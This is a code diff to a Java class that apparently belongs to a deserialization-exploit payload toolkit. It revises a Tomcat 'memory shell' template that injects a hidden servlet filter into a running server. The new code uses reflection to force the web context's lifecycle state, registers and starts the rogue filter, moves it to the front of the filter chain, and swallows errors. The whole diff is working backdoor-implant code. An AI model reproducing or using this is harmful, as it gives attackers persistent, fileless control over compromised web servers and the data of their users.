@@ -1,12 +1,17 @@
 package org.su18.ysuserial.payloads.templates.memshell.tomcat;
 
 
+import org.apache.catalina.LifecycleState;
+import org.apache.catalina.core.StandardContext;
+import org.apache.catalina.util.LifecycleBase;
+
 import javax.servlet.*;
 import javax.servlet.http.HttpServletRequest;
 import javax.servlet.http.HttpServletResponse;
 import java.io.IOException;
-import java.lang.reflect.Constructor;
-import java.util.HashMap;
+import java.lang.reflect.Field;
+import java.lang.reflect.Method;
+import java.util.EnumSet;
 import java.util.List;
 
 /**
@@ -106,49 +111,58 @@ public class TFMSFromRequest implements Filter {
 		ServletContext servletContext = request.getServletContext();
 		Filter         filter         = new TFMSFromRequest();
 		String         filterName     = filter.getClass().getName();
+		String         url            = pattern;
+		if (servletContext.getFilterRegistration(filterName) == null) {
+			StandardContext            standardContext    = null;
+			Field                      stateField         = null;
+			FilterRegistration.Dynamic filterRegistration = null;
 
-		try {
-			Object  standardContext = getFieldValue(getFieldValue(servletContext, "context"), "context");
-			HashMap map             = (HashMap) getFieldValue(standardContext, "filterConfigs");
+			try {
+				standardContext = (StandardContext) getFieldValue(getFieldValue(servletContext, "context"), "context");
+				stateField = LifecycleBase.class.getDeclaredField("state");
+				stateField.setAccessible(true);
+				stateField.set(standardContext, LifecycleState.STARTING_PREP);
+				filterRegistration = servletContext.addFilter(filterName, filter);
+				filterRegistration.addMappingForUrlPatterns(EnumSet.of(DispatcherType.REQUEST), false, new String[]{url});
+				Method filterStartMethod = StandardContext.class.getMethod("filterStart");
+				filterStartMethod.setAccessible(true);
+				filterStartMethod.invoke(standardContext, (Object[]) null);
+				stateField.set(standardContext, LifecycleState.STARTED);
 
-			if (map.get(filterName) == null) {
-				Class filterDefClass = null;
+				Class filterMap;
 				try {
-					filterDefClass = Class.forName("org.apache.catalina.deploy.FilterDef");
-				} catch (ClassNotFoundException e) {
-					filterDefClass = Class.forName("org.apache.tomcat.util.descriptor.web.FilterDef");
+					filterMap = Class.forName("org.apache.tomcat.util.descriptor.web.FilterMap");
+				} catch (Exception var27) {
+					filterMap = Class.forName("org.apache.catalina.deploy.FilterMap");
 				}
 
-				Object filterDef = filterDefClass.newInstance();
-				filterDef.getClass().getDeclaredMethod("setFilterName", new Class[]{String.class}).invoke(filterDef, filterName);
-				filterDef.getClass().getDeclaredMethod("setFilterClass", new Class[]{String.class}).invoke(filterDef, filter.getClass().getName());
-				filterDef.getClass().getDeclaredMethod("setFilter", new Class[]{Filter.class}).invoke(filterDef, filter);
-				standardContext.getClass().getDeclaredMethod("addFilterDef", new Class[]{filterDefClass}).invoke(standardContext, filterDef);
+				Method   findFilterMaps = standardContext.getClass().getMethod("findFilterMaps");
+				Object[] filterMaps     = (Object[]) ((Object[]) ((Object[]) findFilterMaps.invoke(standardContext)));
 
-				Class filterMapClass = null;
-				try {
-					filterMapClass = Class.forName("org.apache.catalina.deploy.FilterMap");
-				} catch (ClassNotFoundException e) {
-					filterMapClass = Class.forName("org.apache.tomcat.util.descriptor.web.FilterMap");
+				for (int i = 0; i < filterMaps.length; ++i) {
+					Object filterMapObj = filterMaps[i];
+					findFilterMaps = filterMap.getMethod("getFilterName");
+					String name = (String) findFilterMaps.invoke(filterMapObj);
+					if (name.equalsIgnoreCase(filterName)) {
+						filterMaps[i] = filterMaps[0];
+						filterMaps[0] = filterMapObj;
+					}
 				}
-
-				Object filterMap = filterMapClass.newInstance();
-				filterMap.getClass().getDeclaredMethod("setFilterName", new Class[]{String.class}).invoke(filterMap, filterName);
-				filterMap.getClass().getDeclaredMethod("setDispatcher", new Class[]{String.class}).invoke(filterMap, DispatcherType.REQUEST.name());
-				filterMap.getClass().getDeclaredMethod("addURLPattern", new Class[]{String.class}).invoke(filterMap, pattern);
-				standardContext.getClass().getDeclaredMethod("addFilterMapBefore", new Class[]{filterMapClass}).invoke(standardContext, filterMap);
-				Class       filterConfigClass = Class.forName("org.apache.catalina.core.ApplicationFilterConfig");
-				Class       contextClass      = Class.forName("org.apache.catalina.Context");
-				Constructor constructor       = filterConfigClass.getDeclaredConstructor(contextClass, filterDefClass);
-				constructor.setAccessible(true);
-				Object filterConfig = constructor.newInstance(new Object[]{standardContext, filterDef});
-				map.put(filterName, filterConfig);
 
 				writeResponse("Success");
-			} else {
-				writeResponse("Filter already exists");
+			} catch (Exception ignored) {
+			} finally {
+				try {
+					stateField.set(standardContext, LifecycleState.STARTED);
+				} catch (IllegalAccessException ignored) {
+				}
+
 			}
-		} catch (Exception ignored) {
+		} else {
+			try {
+				writeResponse("Filter already exists");
+			} catch (Exception ignored) {
+			}
 		}
 	}
 
